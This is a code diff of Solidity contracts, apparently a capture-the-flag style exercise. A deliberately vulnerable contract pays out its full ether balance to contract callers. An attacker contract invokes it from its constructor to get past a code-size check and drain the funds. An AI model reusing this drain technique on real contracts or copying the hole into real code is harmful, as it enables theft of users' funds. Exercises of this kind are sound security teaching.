@@ -18,12 +18,14 @@ contract CallMeMaybeContract {
       _;
     }
 
-    function HereIsMyNumber() public CallMeMaybe{
+    function HereIsMyNumber() public payable CallMeMaybe{
         if(tx.origin == msg.sender) {
             revert("function");
-        } else {
-            console.log("funciona ", payable(msg.sender));
-        (bool succes, ) =  payable(msg.sender).call{value : address(this).balance}("");
+        } else {      
+
+        (bool succes, ) =  payable(msg.sender).call{
+            value : address(this).balance}(""); 
+
         require(succes, "Failed to send Ether");
         
         }
@@ -33,22 +35,42 @@ contract CallMeMaybeContract {
 }
 
 
+
+contract testExtcodesizeCallMeMaybe{
+
+    CallMeMaybeContract atack;
+
+    function callHereIsMyNumber() public {
+        atack.HereIsMyNumber();
+    }
+
+    constructor(address payable _contractAtack){
+        atack = CallMeMaybeContract(_contractAtack);
+    }
+
+}
+
+
+
 contract HackCallMeMaybeContract{
 
     CallMeMaybeContract atack;
 
-    address private atackAddres;   
+    address private atackAddres;    
 
-    constructor(address payable _atack){
-        atackAddres = _atack;
-        atack = CallMeMaybeContract(_atack);
-        atack.HereIsMyNumber();
+    function balanceOf() public view returns (uint256){
+        return (address(this).balance);
     }
 
-     receive() external payable {
-         console.log("llego");
+    receive() external payable {
         (bool succes, ) =  payable(atackAddres).call{value : msg.value}("");
         require(succes, "Failed to send Ether");
+    }
+
+     constructor(address payable _atack){
+        atackAddres = _atack;
+        atack = CallMeMaybeContract(_atack);
+        atack.HereIsMyNumber();        
     }
 
 }
